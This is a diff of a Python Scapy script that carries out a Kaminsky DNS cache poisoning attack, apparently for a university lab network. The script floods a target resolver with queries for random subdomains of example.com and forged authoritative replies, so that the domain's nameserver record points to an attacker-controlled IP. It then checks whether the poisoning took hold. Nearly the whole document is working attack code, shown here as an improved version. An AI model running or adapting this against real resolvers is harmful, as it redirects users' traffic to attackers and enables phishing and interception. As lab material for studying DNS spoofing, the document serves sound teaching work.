@@ -6,43 +6,103 @@ import time
 
 target_dns = "10.10.27.2"
 attacker_ip = "10.10.27.4"
-fake_auth_ip = "199.43.135.53"
+fake_auth_ip = "199.43.135.53" 
 
-def random_subdomain():
-    return ''.join(random.choices(string.ascii_lowercase, k=10))
+def generate_random_subdomain():
+    return ''.join(random.choices(string.ascii_lowercase, k=15))
 
-def attack_once():
-    subdomain = random_subdomain()
+def kaminsky_attack():
+    subdomain = generate_random_subdomain()
     query_name = f"{subdomain}.example.com"
     dns_id = random.randint(1, 65535)
     src_port = random.randint(30000, 60000)
     
-    print(f"Attack: {query_name} (ID: {dns_id})")
+    print(f"🎯 Attack: {query_name} (ID: {dns_id}, Port: {src_port})")
     
-    query_pkt = IP(dst=target_dns, src=attacker_ip)/UDP(sport=src_port, dport=53)/DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
+
+    query_pkt = IP(dst=target_dns, src=attacker_ip) / \
+               UDP(sport=src_port, dport=53) / \
+               DNS(id=dns_id, rd=1, qd=DNSQR(qname=query_name, qtype="A"))
+    
+
+    forged_pkt = IP(src=fake_auth_ip, dst=target_dns) / \
+                UDP(sport=53, dport=src_port) / \
+                DNS(id=dns_id, 
+                    qr=1,   
+                    aa=1,    
+                    rd=0,
+                    qd=DNSQR(qname=query_name, qtype="A"),
+
+                    an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
+ 
+                    ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
+
+                    ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata=attacker_ip))
+    
     send(query_pkt, verbose=0)
-    
-    forged_pkt = IP(src=fake_auth_ip, dst=target_dns)/UDP(sport=53, dport=src_port)/DNS(
-        id=dns_id, qr=1, aa=1, rd=0,
-        qd=DNSQR(qname=query_name, qtype="A"),
-        an=DNSRR(rrname=query_name, ttl=600, rdata="20.23.3.19"),
-        ns=DNSRR(rrname="example.com", ttl=600, type="NS", rdata="ns.hust-cse.net"),
-        ar=DNSRR(rrname="ns.hust-cse.net", ttl=600, rdata="10.10.27.4")
-    )
+    time.sleep(0.001) 
     send(forged_pkt, verbose=0)
+    
+    return query_name
+
+def check_attack_success():
+
+    print("\n🔍 Checking attack status...")
+    
+
+    pkt1 = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com", qtype="NS"))
+    response1 = sr1(pkt1, timeout=2, verbose=0)
+    
+    ns_poisoned = False
+    if response1 and response1.haslayer(DNS):
+        for i in range(response1[DNS].ancount):
+            if response1[DNS].an[i].type == 2: 
+                ns_name = response1[DNS].an[i].rdata.decode()
+                print(f"   example.com NS -> {ns_name}")
+                if 'ns.hust-cse.net' in ns_name:
+                    ns_poisoned = True
+    
+    pkt2 = IP(dst=target_dns) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="ns.hust-cse.net", qtype="A"))
+    response2 = sr1(pkt2, timeout=2, verbose=0)
+    
+    a_poisoned = False
+    if response2 and response2.haslayer(DNS):
+        for i in range(response2[DNS].ancount):
+            if response2[DNS].an[i].type == 1: 
+                ip = response2[DNS].an[i].rdata
+                print(f"   ns.hust-cse.net A -> {ip}")
+                if str(ip) == attacker_ip:
+                    a_poisoned = True
+    
+    return ns_poisoned and a_poisoned
 
 def main():
-    print("Starting Kaminsky attack...")
-    count = 0
+    print("🚀 Starting focused Kaminsky attack...")
+    print("🎯 Target: Poison example.com NS record to ns.hust-cse.net")
     
-    while count < 100:
-        for i in range(20):
-            attack_once()
-            time.sleep(0.01)
+    attack_count = 0
+    max_attacks = 500
+    
+    while attack_count < max_attacks:
+        attack_count += 1
         
-        count += 1
-        print(f"Batch {count} completed")
+        for i in range(20):
+            kaminsky_attack()
+            time.sleep(0.005) 
+        
+        print(f"Batch {attack_count} completed ({attack_count * 20} packets sent)")
+        
+        if attack_count % 2 == 0:
+            if check_attack_success():
+                print("\n SUCCESS! DNS cache fully poisoned!")
+                print("   example.com NS -> ns.hust-cse.net")
+                print("   ns.hust-cse.net A -> 10.10.27.4")
+                break
+        
         time.sleep(0.5)
+    
+    if attack_count >= max_attacks:
+        print("\n⚠️  Maximum attempts reached. Attack may need timing adjustment.")
 
 if __name__ == "__main__":
     main()
